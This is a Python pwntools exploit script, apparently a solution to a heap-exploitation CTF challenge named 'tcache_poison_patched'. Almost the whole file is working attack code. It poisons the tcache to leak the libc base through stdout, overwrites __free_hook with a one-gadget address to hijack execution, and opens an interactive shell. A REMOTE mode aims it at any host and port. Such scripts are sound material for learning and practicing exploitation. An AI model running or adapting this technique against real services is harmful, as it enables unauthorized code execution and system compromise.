#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('tcache_poison_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+262
b *main+322
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def allocate(size, data):
    io.sendline(b"1")
    io.sendlineafter(b"Size:", str(size).encode())
    io.sendafter(b"Content:", data)


def free():
    io.sendline(b"2")


def edit(data):
    io.sendline(b"4")
    io.sendafter(b"chunk:", data)


def leak_base():
    allocate(20, b"A"*8)
    free()
    edit(p64(exe.sym["stdout"]))

    allocate(20, b"A"*8)

    stdout_lsb = p64(libc.sym['_IO_2_1_stdout_'])[0:1]
    allocate(20, stdout_lsb)

    io.sendline(b"3")
    io.recvuntil(b"Content: ")
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - libc.sym['_IO_2_1_stdout_']
    info("libc base: %#x", libc.address)


def write_hook():
    free_hook = libc.sym["__free_hook"]
    og = libc.address + 0x4f432

    info("__free_hook: %#x", free_hook)
    info("one gadget: %#x", og)

    allocate(0x40, b"B"*8)
    free()
    edit(p64(free_hook))
    allocate(0x40, b"B"*8)
    allocate(0x40, p64(og))

    # io.sendline(b"2")    



def solve():

    leak_base()
    write_hook()

    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()

